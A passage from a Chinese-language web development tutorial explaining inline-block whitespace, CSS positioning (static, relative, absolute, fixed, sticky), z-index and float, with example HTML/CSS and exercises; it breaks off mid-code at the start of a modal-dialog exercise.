20px;}</code></pre><blockquote><p>注意:虽然这样做可以给人块元素的感觉，但是还是有区别的，不要用这种方式去设置一个规定大小的块，否则会出现如下的奇怪现象。</p></blockquote><p>如：</p><pre><code>&lt;a href="#"&gt;超链接&lt;/a&gt;&lt;div&gt;&lt;/div&gt;a {  background-color: #fff2cc;  padding: 20px;}div {  width: 300px;  height: 50px;  background-color: #b0e3e6;}</code></pre><h4 id="3-行内元素可以设置左右margin，但是不能设置上下margin"><a href="#3-行内元素可以设置左右margin，但是不能设置上下margin" class="headerlink" title="3. 行内元素可以设置左右margin，但是不能设置上下margin"></a>3. 行内元素可以设置左右margin，但是不能设置上下margin</h4><p>案例：</p><pre><code>&lt;a href="#"&gt;点击跳转到&lt;/a&gt;&lt;span&gt;优课达&lt;/span&gt;&lt;div&gt;&lt;/div&gt;a {  margin-left: 40px;  margin-right: 30px;  margin-top: 400px;  margin-bottom: 400px;}span {  margin-left: 20px;}div {  width: 300px;  height: 50px;  background-color: #b0e3e6;}</code></pre><p><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/inline3.png" alt="image"></p><p>可以看到，我们虽然设置了很大上下<code>margin</code>，但是毫无效果，但是左右<code>margin</code>实现的效果与块元素的margin效果是一样的。</p><h4 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h4><p>从名字可以看出，<code>inline-block</code>既具有<code>block</code> 的性质，还具有<code>inline</code>的性质，可以简单的理解为，<code>inline-block</code>就是一个可以在同一行显示的块元素。</p><p><code>inline-block</code>要比<code>block</code>在应用中更为广泛，因为我们更多的时候需要的是一个能和其他元素共存的盒子，相比而言，<code>block</code> 显得较为孤僻。</p><p>关于<code>inline-block</code>这个值的作用，大家可以根据<code>block</code>的性质去理解，这里主要给大家介绍一下空白折叠的现象。</p><p>按照常理，我们将<code>div</code>的<code>display</code>属性从<code>block</code>切换成<code>inline-block</code>之后，我们得到的结果会发现两个盒子中间多了一点空白，但是我们并没有设置margin,这就是传说中的空白折叠现象，其原因就是因为两个<code>div</code><br>之间多了一个回车,在<code>html</code>中，回车被当作是一个文字，所以这里的空白就是文字的空白，相当于在两个<code>div</code>之间加了一个字母。</p><p>解决这个空白的办法有三种:</p><p><strong>1. 去除回车</strong></p><pre><code>&lt;!-- 将div标签写在一行 --&gt;&lt;div class="box1"&gt;&lt;/div&gt;&lt;div class="box2"&gt;&lt;/div&gt;div {  width: 200px;  height: 50px;  display: inline-block;}.box1 {  background-color: #fff2cc;}.box2 {  background-color: #b0e3e6;}</code></pre><p><strong>2. 给父元素添加word-spacing属性</strong><br><code>word-spacing</code>就是单词和单词之间的距离，这里将这个距离写成负值就可以了，这个值要尽量小，我们一般写小于-20px的值。</p><pre><code>&lt;div class="father"&gt;  &lt;div class="box1"&gt;&lt;/div&gt;  &lt;div class="box2"&gt;&lt;/div&gt;&lt;/div&gt;.father {  word-spacing: -50px;}.box1 {  width: 200px;  height: 50px;  display: inline-block;  background-color: #fff2cc;}.box2 {  width: 200px;  height: 50px;  display: inline-block;  background-color: #b0e3e6;}</code></pre><p><strong>3.给父元素设置<code>font-size: 0px</code>;</strong></p><p>从第二点我们了解到，回车可以当作是一个文字，那么如果将文字大小设置为0,空隙自然就会消失。</p><pre><code>&lt;div class="father"&gt;  &lt;div class="box1"&gt;&lt;/div&gt;  &lt;div class="box2"&gt;&lt;/div&gt;&lt;/div&gt;.father {  font-size: 0px;}.box1 {  width: 200px;  height: 50px;  display: inline-block;  background-color: #fff2cc;}.box2 {  width: 200px;  height: 50px;  display: inline-block;  background-color: #b0e3e6;}</code></pre><p>案例：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/exercse-pic/6-1-%E8%AE%BE%E8%AE%A1%E5%9B%BE.png" alt="image"></p><p>将li标签:</p><ul><li>字体大小为12px</li><li>字体颜色为fffff</li><li>文字左右居中</li><li>背景颜色为#783A3E</li></ul><pre><code>li {    display: inline-block;    list-style: none;    font-size: 12px;    color: #ffffff;    text-align: center;    background-color: #783A3E;    width: 70px;    height: 30px;    line-height: 30px;;}ul {  font-size: 0px;  margin: 0px;  padding: 0px;}</code></pre><p>案例：<br><img src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.7/exercse-pic/6-2-%E8%AE%BE%E8%AE%A1%E5%9B%BE.png" alt="image"></p><ul><li>页面中所有文字颜色均为#ffff</li><li>顶部”商品分类”背景色为#C60A0A,”天猫双十一”背景色为#464444，底部列表背景色为#413F3F</li><li>“商品分类”、”天猫双十一”字体大小为12px</li><li>列表边框颜色为#cb0c10,粗细1px，倒角10px</li><li>列表里的每个选项都是超链接，要用a标签包裹起来，可点击范围不能只是文字，而是红色边框内的所有区域。</li></ul><p>css:</p><pre><code>ul,li {  list-style: none;  padding: 0px;  margin: 0px;}.head {  width:200px;  color: #ffffff;  font-size: 0px;}.head li {  display: inline-block;  line-height: 36px;  font-size: 12px;  text-align: center;  width: 100px;}.head .head-first{  background-color: #C60A0A;}.head .head-second {  background-color: #464444;}.list {  width: 200px;  background-color: #413F3F;  padding-top: 29px;  padding-bottom: 14px;  box-sizing: border-box;}.list li {  padding-left: 24px;  padding-right: 24px;  margin-bottom: 14px;}.list li a {  display: block;  border: 1px solid #cb0c10;  border-radius: 10px;  text-align: center;  line-height: 29px;  color: #ffffff;  text-decoration: none;}</code></pre><p>html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;案例&lt;/title&gt;    &lt;link rel="stylesheet" href="./index.css"&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul class="head"&gt;      &lt;li class="head-first"&gt;商品分类&lt;/li&gt;      &lt;li class="head-second"&gt;天猫双十一&lt;/li&gt;    &lt;/ul&gt;    &lt;ul class="list"&gt;      &lt;li&gt;&lt;a href="#"&gt;大牌女装&lt;/a&gt;&lt;/li&gt;      &lt;li&gt;&lt;a href="#"&gt;运动户外&lt;/a&gt;&lt;/li&gt;      &lt;li&gt;&lt;a href="#"&gt;潮流男装&lt;/a&gt;&lt;/li&gt;      &lt;li&gt;&lt;a href="#"&gt;美妆洗护&lt;/a&gt;&lt;/li&gt;      &lt;li&gt;&lt;a href="#"&gt;母婴好货&lt;/a&gt;&lt;/li&gt;      &lt;li&gt;&lt;a href="#"&gt;数码家电&lt;/a&gt;&lt;/li&gt;      &lt;li&gt;&lt;a href="#"&gt;家具建材&lt;/a&gt;&lt;/li&gt;      &lt;li&gt;&lt;a href="#"&gt;全球尖货&lt;/a&gt;&lt;/li&gt;      &lt;li&gt;&lt;a href="#"&gt;苏宁易购&lt;/a&gt;&lt;/li&gt;      &lt;li&gt;&lt;a href="#"&gt;汽车用品&lt;/a&gt;&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="第八章：CSS定位（一）"><a href="#第八章：CSS定位（一）" class="headerlink" title="第八章：CSS定位（一）"></a>第八章：CSS定位（一）</h2><h3 id="8-1Position-static"><a href="#8-1Position-static" class="headerlink" title="8.1Position-static"></a>8.1Position-static</h3><p>这节我们学习非常关键的属性——<code>position</code>，用于定位DOM元素，修改DOM元素的布局</p><p>先看之前的案例：</p><pre><code>body {  margin: 0; /*去掉默认的样式*/  font-family: Sans-serif;  color: rgba(0, 0, 0, 0.84);  font-size: 16px;  padding: 30px;}img{  width: 100%;}&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;!--系统内置 start--&gt;&lt;script type="text/javascript" src="//qgt-style.oss-cn-hangzhou.aliyuncs.com/commonJSCSS/console.js"&gt;&lt;/script&gt;&lt;!--系统内置 end--&gt;  &lt;meta charset="utf-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;h1 class="title"&gt;MOUNTAIN&lt;/h1&gt;  &lt;p&gt;    The Facebook post was heartfelt. We like our little town just as it is:    Little. Homey. Just us’ns.  &lt;/p&gt;  &lt;div class="img-box"&gt;    &lt;img      class="first"      alt=""      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/1.jpg?x-oss-process=image/resize,h_300"    /&gt;    &lt;img      alt=""      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2.jpg?x-oss-process=image/resize,h_300"    /&gt;    &lt;img      alt=""      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3.jpg?x-oss-process=image/resize,h_300"    /&gt;    &lt;img      alt=""      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/4.jpg?x-oss-process=image/resize,h_300"    /&gt;  &lt;/div&gt;  &lt;h2&gt;LISTEN&lt;/h2&gt;  &lt;p&gt;    Listen, I can empathize. As someone who’s lived in the Denver area since    1971 — right about the time John Denver’s songs were enticing folks to move  &lt;/p&gt;  &lt;footer&gt;&lt;/footer&gt;&lt;/body&gt;</code></pre><p>大家可能会发现，我们在<code>index.css</code>中并没有设置任何的<code>position</code>属性。浏览器会自动给所有的DOM元素,添加<code>position: static</code></p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/1-static/1.png" alt="image"></p><blockquote><p>因此static遵循默认的文档流布局，top、 left、 right、bottom(我们在后面几节会讲到这几个属性)属性都无效。</p></blockquote><p><code>position</code>除了<code>static</code>属性值外，还有4个常用值,分别为:</p><ul><li>relative (相对定位)</li><li>absolute (绝对定位)</li><li>fixed (固定定位)</li><li>sticky (粘性定位)</li><li>接下来，我们分别来学些下这几个值有什么特点。</li></ul><h3 id="8-2Position——relative（相对定位）"><a href="#8-2Position——relative（相对定位）" class="headerlink" title="8.2Position——relative（相对定位）"></a>8.2Position——relative（相对定位）</h3><p>如何实现以下图片呢</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2-relative/1.jpeg" alt="image"></p><p>如果如下操作</p><pre><code>.first {  margin-left: 50px;  margin-top: 50px;}</code></pre><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2-relative/2.jpeg" alt="image"></p><p>结果预览和我们想要的效果不太一样。第一张图片确实右下移动了，但是文档下面部分也同样往下移动了50px。 也就是<code>margin</code> 会引起文档流的变化。</p><p>这里我们就便可以利用<code>left, top</code>来实现想要的效果。 在上一节<br>中，我们知道position: static<br>下不能使用<code>left, top, right, bottom</code>属性, 如果我们想在当前位置进行偏<br>移，同时不影响整体页面布局。可以使用<br><code>relative</code></p><pre><code>.first {  position: relative;  left: 50px;  top: 50px;}</code></pre><ul><li>left: 50px,表示距离自己原来位置左侧50px</li><li>top: 50px,表示距离自己原来位置顶部50px</li></ul><p>案例：<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2-relative/3.jpeg" alt="image"></p><pre><code>body {  margin: 0; /*去掉默认的样式*/  font-family: Sans-serif;  color: rgba(0, 0, 0, 0.84);  font-size: 16px;  padding: 30px;}img {  width: 100%;}.second {  position: relative;  left: 100px;}</code></pre><h3 id="8-3Position——cbsolute（绝对定位）"><a href="#8-3Position——cbsolute（绝对定位）" class="headerlink" title="8.3Position——cbsolute（绝对定位）"></a>8.3Position——cbsolute（绝对定位）</h3><p>演示：</p><pre><code>body {  margin: 0; /*去掉默认的样式*/  font-family: Sans-serif;  color: rgba(0, 0, 0, 0.84);  font-size: 16px;  padding: 30px;}img {  width: 100%;}.first {  position: absolute;  left: 50px;  top: 50px;}</code></pre><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3-absolute/1.jpeg" alt="image"></p><p>在图中和<code>relative</code>相比较</p><ol><li>文档第-张下面的所有DOM元素，自动往上移动占据了第一张图片的位置，文档流(布局)已经没有为第一张图预留空间了</li><li>第一张图片脱离了文档流，变成了第二个图层，再在新的图层中往右下偏移50px</li></ol><p>在MDN中，官方描述为.</p><blockquote><p>absolute被称为<strong>绝对定位</strong><br>绝对定位不为元素预留空间，通过指定元素相对于最近的非static定位祖先元素的偏移，来确定元素位置</p></blockquote><p>我们重点理解下，什么叫做<strong>相对于最近的非static定位祖先元素的偏移</strong>?</p><p>在这里，我们提取三个关键词<strong>最近</strong>和<strong>非static定位</strong>和<strong>祖先元素</strong>。</p><p>连贯起来分析下在上面的网页中，浏览器是怎么布局absolute元素的。</p><ol><li><p>首先我们获取到第一张图片元素<code>&lt;img class="first” src="xxx"/&gt;</code>,我们发现它是<strong>absolute</strong>布<br>局</p></li><li><p>因此寻找它的父亲节点<code>&lt;div class="img -box"&gt;</code>,我们发现此元素并未配置position属性，其遵循默认布局<strong>position=static</strong>，并不符合非static要求。</p></li><li><p>因此继续找<code>&lt;div class="img-box"&gt;</code>的父亲节点，找到</p></li><li><p><code>&lt;body&gt;</code>已经没有父亲节点了，所以按照的位置为标准进行偏移</p></li></ol><p>案例：</p><pre><code>body {  margin: 0; /*去掉默认的样式*/  font-family: Sans-serif;  color: rgba(0, 0, 0, 0.84);  font-size: 16px;  padding: 30px;}img {  width: 100%;}.img-box {  position: relative;}.first {  position: absolute;  left: 50px;  top: 50px;}&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;!--系统内置 start--&gt;&lt;script type="text/javascript" src="//qgt-style.oss-cn-hangzhou.aliyuncs.com/commonJSCSS/console.js"&gt;&lt;/script&gt;&lt;!--系统内置 end--&gt;  &lt;meta charset="utf-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;h1 class="title"&gt;MOUNTAIN&lt;/h1&gt;  &lt;p&gt;    The Facebook post was heartfelt. We like our little town just as it is:    Little. Homey. Just us’ns.  &lt;/p&gt;  &lt;div class="img-box"&gt;    &lt;img      class="first"      alt=""      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/1.jpg?x-oss-process=image/resize,h_300"    /&gt;    &lt;img      alt=""      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2.jpg?x-oss-process=image/resize,h_300"    /&gt;    &lt;img      alt=""      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3.jpg?x-oss-process=image/resize,h_300"    /&gt;    &lt;img      alt=""      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/4.jpg?x-oss-process=image/resize,h_300"    /&gt;  &lt;/div&gt;  &lt;h2&gt;LISTEN&lt;/h2&gt;  &lt;p&gt;    Listen, I can empathize. As someone who’s lived in the Denver area since    1971 — right about the time John Denver’s songs were enticing folks to move  &lt;/p&gt;  &lt;footer&gt;&lt;/footer&gt;&lt;/body&gt;</code></pre><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3-absolute/2.jpeg" alt="image"></p><p>我们会发现第一-张图片相对<code>&lt;div class="img -box"&gt;</code>进行了偏移，而不是之前的body元素。</p><blockquote><p>总结下: absolute (绝对定位)和relation (相对定位)的区别，relation是相对自己进行top、left、 right、 bottom 进行偏<br>移，而absolute寻找最近的非static的祖先节点进行偏移。</p></blockquote><h3 id="8-4Position-fixed-固定定位"><a href="#8-4Position-fixed-固定定位" class="headerlink" title="8.4Position-fixed(固定定位)"></a>8.4Position-fixed(固定定位)</h3><p>在很多场景下，文章的标题会一直停留在浏览器的顶部， 不会随着页面的滚动而消失</p><p>这就是fixed的功能，和英文单词意思非常相近————固定。<br><img src="http://document.youkeda.com/P3-1-HTML-CSS/1.8/4-fixed/6.png" alt="image"></p><pre><code>body {  margin: 0; /*去掉默认的样式*/  font-family: Sans-serif;  color: rgba(0, 0, 0, 0.84);  font-size: 16px;  padding: 30px;}img {  width: 100%;}h1 {  position: fixed;  /*去掉H1默认的样式*/  padding: 0;  margin: 0;  left: 30px;  top: 50px;  color: yellowgreen; /*为了方便观看，我们修改MOUNTAIN的颜色*/}.img-box {  position: relative;}</code></pre><p>我们会发现无论怎么滚动，MOUNTAIN永远在窗口的左上角。</p><blockquote><p>fixed为固定定位</p></blockquote><blockquote><p>固定定位和绝对定位类似，元素的包含块为屏幕视口(viewport)</p></blockquote><blockquote><p>固定定位不为元素预留空间，而是通过指定元素相对于屏幕视口(viewport)</p></blockquote><blockquote><p>的位置来指定元素位置。元素的位置在屏幕滚动时不会改变。</p></blockquote><p>但继续滚动，我们会发现MOUNTAIN被图片区域遮挡了，这是为什么呢?</p><p>此时需要z-index解决</p><p><strong>z-index</strong></p><p>在刚才 <code>absolute</code> ,<code>fixed</code>演示中，我们知道HTML页面是由多<br>个图层构成的，那浏览器怎么决定不同的图层优先级呢(到底是谁覆盖谁、谁在谁的上面，谁离观察者最近) ?这就是z-index 决<br>定。</p><blockquote><p>1.默认非static元素的z-index都为0<br>2. z-index越大，则越在最上面，离观察者越近<br>3.同样的z-index，在HTML中的元素越靠后，则越在最上面，离观察者越近</p></blockquote><p>因此，分析下上面的场景中<code>&lt;h1 &gt;MOUNTAIN&lt;/h1&gt;</code>元素和<code>&lt;div class=" img-box"&gt;&lt;/div&gt;</code>元素都是非static 元素，<code>z- index</code> 都为0。</p><p>而因为<code>&lt;h1&gt;</code>在文档流前部，因此会被后者遮挡，所以MOUNTAIN移动到图片区域时，被图片遮挡了，那我们如何解决?</p><p>很简单，我们修改<code>&lt;h1&gt;</code>的Z- index大于0即可!大家可以修改下代码，观察下效果，如下所示:</p><pre><code>h1 {  position: fixed;  left: 30px;  top: 30px;  z-index: 1;  color: yellowgreen;}</code></pre><p>案例：</p><p>为了实现每张图片的名称都显示在其右上角，我们需要把图片和名字包裹在一一个容器里面，再利用学习到的绝对定位进行渲染<br><img src="http://document.youkeda.com/P3-1-HTML-CSS/1.8/5-homework/2.png" alt="image"></p><pre><code>body {  margin: 0; /*去掉默认的样式*/  font-family: Sans-serif;  color: rgba(0, 0, 0, 0.84);  font-size: 16px;  padding: 30px;}img {  width: 100%;}.img-item {  position: relative;}.img-item &gt; span {  position: absolute;  right: 10px;  top: 10px;  font-size: 20px;  color: yellow;}</code></pre><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset="utf-8" /&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;title&gt;优课达&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;h1 class="title"&gt;MOUNTAIN&lt;/h1&gt;  &lt;p&gt;    The Facebook post was heartfelt. We like our little town just as it is:    Little. Homey. Just us’ns.  &lt;/p&gt;  &lt;div class="img-box"&gt;    &lt;div class="img-item"&gt;      &lt;img        class="first"        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/1.jpg?x-oss-process=image/resize,h_300"      /&gt;      &lt;span&gt;图片1&lt;/span&gt;    &lt;/div&gt;    &lt;div class="img-item"&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2.jpg?x-oss-process=image/resize,h_300"      /&gt;      &lt;span&gt;图片2&lt;/span&gt;    &lt;/div&gt;    &lt;div class="img-item"&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3.jpg?x-oss-process=image/resize,h_300"      /&gt;      &lt;span&gt;图片3&lt;/span&gt;    &lt;/div&gt;    &lt;div class="img-item"&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/4.jpg?x-oss-process=image/resize,h_300"      /&gt;      &lt;span&gt;图片4&lt;/span&gt;    &lt;/div&gt;  &lt;/div&gt;  &lt;h2&gt;LISTEN&lt;/h2&gt;  &lt;p&gt;    Listen, I can empathize. As someone who’s lived in the Denver area since    1971 — right about the time John Denver’s songs were enticing folks to move  &lt;/p&gt;  &lt;footer&gt;&lt;/footer&gt;&lt;/body&gt;</code></pre><h3 id="8-6Position——sticky（课外阅读）"><a href="#8-6Position——sticky（课外阅读）" class="headerlink" title="8.6Position——sticky（课外阅读）"></a>8.6Position——sticky（课外阅读）</h3><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.8/6-sticky/1.mp4" target="_blank" rel="noopener">效果视频</a></p><p>注意MOUNTAIN的效果，在它滚动到顶部时，黏在了顶部。而当页面往下面滚动时，MOUNTAIN又会恢复其在文档中的位置，这种效果就是sticky的效果，我们看下代码</p><pre><code>body {  margin: 0; /*去掉默认的样式*/  font-family: Sans-serif;  color: rgba(0, 0, 0, 0.84);  font-size: 16px;  padding: 30px;}img {  width: 100%;}h1 {  position: sticky;  color: yellowgreen;  top: 50px;  z-index: 1;}</code></pre><p>这个布局是position的新特性，sticky中文叫做粘性,因此这种布局，我们叫做粘性布局。在很多网站都有sticky效果，我们来看几个实际场.景，大家可以实际滚动页面，观察高亮元素的位置。</p><p><a href="https://www.taobao.com/" target="_blank" rel="noopener">淘宝网</a></p><p><a href="https://www.zhihu.com/" target="_blank" rel="noopener">知乎</a></p><p><a href="https://www.apple.com/cn/macbook-air/" target="_blank" rel="noopener">苹果</a></p><h2 id="第九章-CSS—（定位二）"><a href="#第九章-CSS—（定位二）" class="headerlink" title="第九章:CSS—（定位二）"></a>第九章:CSS—（定位二）</h2><h3 id="9-1：Float"><a href="#9-1：Float" class="headerlink" title="9.1：Float"></a>9.1：Float</h3><p>float是CSS中最常用的布局属性，使用他可以让元素靠<br>左或者靠右排版。</p><p>它使用起来的是非常简单的。但使用后引起的行为是千变<br>万化了，可能会引起祖先，兄弟，后代元素布局的变化,<br>如果以后因为float遇到奇奇怪怪问题，不要着急，耐心<br>解决。我们先从一个案例开始:</p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.9/1-float/1.mp4" target="_blank" rel="noopener">视频地址</a></p><p>大家可以发现，我们在上一篇文章的基础上，加上了一个导航栏，显示优课达logo和用户头像。</p><p>分析下整个网页，它主要由两部分构成</p><ul><li>顶部导航栏,分为左边logo和右边人物头像</li><li>主体区域是4个图片组成</li></ul><p><strong>主体布局实现</strong><br>先用上一节的知识实现一下上下布局</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;优课达&lt;/title&gt;    &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;nav&gt;&lt;/nav&gt;    &lt;main&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/1.jpg?x-oss-process=image/resize,h_500"      /&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2.jpg?x-oss-process=image/resize,h_500"      /&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3.jpg?x-oss-process=image/resize,h_500"      /&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/4.jpg?x-oss-process=image/resize,h_500"      /&gt;    &lt;/main&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>在这里我们看到两个新标签<code>nav</code> <code>main</code> , 这两个标签都<br>是<code>HTML5</code>标签。相比较div,它们是有含义的，可以更明确的传达区块的含义。</p><blockquote><p>nav: -般用于表示此区块是导航区域<br>main:一般用户表示此区块是网页的主体区域<br>还有其他标签，我们之后会慢慢学到</p></blockquote><p>然后我们用上一节学到的知识，把头部导航fixed住,<br>CSS如下:</p><pre><code>body {  /*去除默认的样式*/  padding: 0;  margin: 0;  background-color: #f5f5f5;}nav {  position: fixed;  width: 100%;  height: 68px;  border: 1px solid #f4f4f4;  background-color: #fff;}img {  width: 100%;}main {  padding-top: 68px; /*1*/}</code></pre><p>注意1处代码，因为nav的fixed属性会导致其脱离正<br>常的文档流，因此main区域会上移,导致第一张图片被<br>遮挡显示不全，所以我们设置一个padding-top解决遮<br>挡问题，最终效果如下:<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/1-float/4.jpg" alt="image"></p><p><strong>头部导航实现</strong></p><p>基本头部元素</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/1-float/5.png" alt="image"></p><p>首先补全html代码</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;优课达&lt;/title&gt;    &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;nav class="nav"&gt;      &lt;img class="logo" src="https://style.youkeda.com/img/ykd-components/logo.png" /&gt;      &lt;img class="avatar" src="https://qgt-document.oss-cn-beijing.aliyuncs.com/P3-1-HTML-CSS/1.9/1-float/avatar.png"/&gt;    &lt;/nav&gt;    &lt;main&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/1.jpg?x-oss-process=image/resize,h_500"      /&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2.jpg?x-oss-process=image/resize,h_500"      /&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/3.jpg?x-oss-process=image/resize,h_500"      /&gt;      &lt;img        src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/4.jpg?x-oss-process=image/resize,h_500"      /&gt;    &lt;/main&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>在导航栏中，加入两张图片，一张logo, 一张头像。</p><p>补全标注中基本的宽高样式</p><pre><code>.logo {  width: 100px;  height: 36px;}.avatar {  width: 36px;  height: 36px;}</code></pre><pre><code>body {  /*去除默认的样式*/  padding: 0;  margin: 0;  background-color: #f5f5f5;}nav {  position: fixed;  width: 100%;  height: 68px;  border: 1px solid #f4f4f4;  background-color: #fff;}img {  width: 100%;}main {  padding-top: 68px; /*1*/}.logo {  width: 100px;  height: 36px;}.avatar {  width: 36px;  height: 36px;}</code></pre><p>效果:<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/1-float/3.jpg" alt="image"></p><p>已经完成了头部元素的创建，接下来我们怎么才能使优课达图标靠左，而头像靠右呢?这就是本节的重点<strong>float</strong>.</p><p><strong>float</strong>–中文意思<strong>浮动</strong>，当然就有往左浮动，往右浮动。这就是float的两个最基本的属性:</p><ul><li>left</li><li>right<br>在这里，我们分别设置两个图标的CSS如下:</li></ul><p>添加：</p><pre><code>.logo {  float: left;}.avatar {  float: right;}</code></pre><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/1-float/2.jpg" alt="image"></p><p>在什么时候需要使用float呢?主要使用场景有两种:</p><ol><li>如果我们想要一组元素同时靠左靠右对齐， 可以使用float,正<br>如上面案例一样</li><li>如果我们想要文字围绕图片，可以使用float,这个大家先了解.<br>下，后面用到，我们会具体讲到。</li></ol><p>作业：</p><p>利用<code>float</code>,<code>盒模型</code>知识完成<strong>QQ注册页头部开发</strong>，如下图红框区域</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/2.jpeg" alt="image"></p><p>注意</p><ol><li>QQ注册页是全屏页面，需要使用浏览器右上角的全屏按钮查看演示效果</li><li>导航栏高度为84px</li></ol><p><strong>图片资源</strong></p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/arrow-down.png" target="_blank" rel="noopener">向下箭头</a></p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/qq.png" target="_blank" rel="noopener">QQlogo</a></p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/1.9/3-qq/bright.png" target="_blank" rel="noopener">QQ靓号</a></p><p><strong>figma</strong><br>从这次作业开始，我们将利用Figma给大家提供标注。让大家学习下，如何根据专业设计师的设计稿进行开发。。<br>本次作业设计稿地址:<br><a href="https://www.figma.com/file/QlB3P8eWLONdMhfRxirqVw/QQ%E6%B3%A8%E5%86%8C%E9%A1%B5" target="_blank" rel="noopener">QQ头部设计稿</a></p><p>figma注册/登录视频</p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/figma%E7%99%BB%E5%BD%95%E8%A7%86%E9%A2%91.mp4" target="_blank" rel="noopener">figma注册/登录视频</a></p><p>figma操作</p><p><a href="https://document.youkeda.com/P3-1-HTML-CSS/figma%E6%93%8D%E4%BD%9C%E8%A7%86%E9%A2%91.mp4" target="_blank" rel="noopener">figma操作</a></p><h3 id="9-2定位实战（一）：模态框"><a href="#9-2定位实战（一）：模态框" class="headerlink" title="9.2定位实战（一）：模态框"></a>9.2定位实战（一）：模态框</h3><p>大家可能对模态框这个概念比较模糊，我们来看几个案例，注意这几个页面弹框部分<br><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-1-modal/1.png" alt="image"></p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-1-modal/2.png" alt="image"></p><p>当然还有很多很多，通过这些案例，我们总结下模态框的特点</p><blockquote><ol><li>模态框总是在浏览器的中心，浏览器随意的放大缩小，模态框还是在浏览器中心</li><li>模态框总有一个半透明的背景</li></ol></blockquote><p>接下来，我们试着开发下模态框</p><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>我们继续在float小节的案例上继续开发，在页面中心完成一个优课达模态框，如下图所示:</p><p><img src="https://document.youkeda.com/P3-1-HTML-CSS/1.9/combat-1-modal/4.png" alt="image"></p><p>首先回顾一下之前的<code>HTML</code>代码</p><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;link rel="stylesheet" type="text/css" href="./index.css" /&gt;&lt;/head&gt;&lt;body&gt;  &lt;nav class="nav"&gt;    &lt;img      class="logo"      src="https://style.youkeda.com/img/ykd-components/logo.png"    /&gt;    &lt;img      class="avatar"      src="https://thirdqq.qlogo.cn/g?b=oidb&amp;k=xnT9D0hzSGjSOOZkzqoutA&amp;s=100&amp;t=1555898643"    /&gt;  &lt;/nav&gt;  &lt;main&gt;    &lt;img      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/1.jpg?x-oss-process=image/resize,h_500"    /&gt;    &lt;img      src="https://document.youkeda.com/P3-1-HTML-CSS/1.8/2.jpg?x-oss-process=image/resize,h_500"    /&gt;    &lt;img 